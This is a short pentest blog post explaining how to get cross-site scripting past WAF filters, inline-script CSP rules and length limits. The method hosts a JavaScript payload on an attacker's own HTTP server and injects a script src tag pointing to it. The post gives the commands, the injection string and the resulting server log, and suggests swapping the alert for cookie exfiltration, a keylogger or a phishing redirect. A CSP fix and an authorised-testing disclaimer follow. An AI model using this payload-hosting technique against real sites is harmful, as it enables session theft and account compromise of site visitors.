---
layout: single
title: "XSS — Moving the Payload to an External Resource"
date: 2026-05-14
categories:
  - tools
  - payloads
  - xss
tags:
  - xss
  - cross-site-scripting
  - payloads
  - javascript
  - waf-bypass
  - reflected-xss
  - stored-xss
  - web-application-pentest
  - owasp
  - owasp-a03-injection
  - cwe-79
  - bugbounty
  - tools
  - python
  - http-server
author_profile: true
read_time: true
show_date: true
toc: true
toc_label: "Contents"
excerpt: "When inline script injection is blocked, host your payload externally and load it via a script src tag — bypassing length limits and WAF rules that filter inline scripts."
header:
  teaser: /assets/images/Logo.png
---

<style>
.tool-cmd{background:#0a0a0a;border:1px solid #1e1e1e;border-left:3px solid #9fef00;border-radius:4px;padding:10px 14px;font-family:'Courier New',monospace;font-size:12px;color:#9fef00;margin:10px 0;white-space:pre-wrap;}
.tool-out{background:#0a0a0a;border:1px solid #1e1e1e;border-left:3px solid #4488ff;border-radius:4px;padding:10px 14px;font-family:'Courier New',monospace;font-size:11px;color:#888;margin:10px 0;white-space:pre-wrap;line-height:1.8;}
.remediation-box{background:#050d05;border:1px solid #9fef0022;border-radius:6px;padding:10px 14px;margin:16px 0;font-size:12px;color:#9fef0088;font-family:'Courier New',monospace;}
.remediation-box strong{color:#9fef00;}
table{width:100%;border-collapse:collapse;font-family:'Courier New',monospace;font-size:12px;margin:16px 0;}
th{background:#0a0a0a;color:#9fef00;padding:8px 12px;border:1px solid #1e1e1e;text-align:left;}
td{padding:8px 12px;border:1px solid #1e1e1e;color:#ccc;}
</style>

## Why External Resources?

Inline payloads like `<script>alert(1)</script>` are often blocked by:
- WAFs checking for `<script>` tags
- CSP `unsafe-inline` restrictions
- Input length limits

Hosting the payload on your own server and loading it via `src=` sidesteps all of these — the browser fetches and executes it cleanly.

## Step-by-Step

**Step 1 — Create the payload file on your attack machine:**

<div class="tool-cmd">echo "alert(1)" > xss.js</div>

**Step 2 — Start a Python HTTP server:**

<div class="tool-cmd">python3 -m http.server 80</div>

**Step 3 — Submit the injection:**

```html
<script src="http://192.168.XX.XX/xss.js"></script>
```

## What the Server Sees

<div class="tool-out">Serving HTTP on 0.0.0.0 port 80
192.168.1.X - - [14/May/2026 12:00:01] "GET /xss.js HTTP/1.1" 200 -</div>

That GET hit confirms the victim's browser executed your script. Replace `alert(1)` with any payload — cookie exfil, keylogger, phishing redirect.

<div class="remediation-box"><strong>Fix:</strong> Implement a strict Content Security Policy: <code>script-src 'self'</code> — this blocks external script sources entirely. Also validate and sanitise all reflected input.</div>

---

*All payloads documented for authorised security testing only. Do not use against systems without explicit written permission.*

<a href="https://buymeacoffee.com/sweshinfosec" target="_blank" style="font-family:monospace;font-size:13px;color:#9fef00;">&#9749; Buy Me a Coffee</a>
&nbsp;&nbsp;
<a href="https://www.patreon.com/c/SweshInfoSec" target="_blank" style="font-family:monospace;font-size:13px;color:#ff9800;">Patreon &rarr;</a>
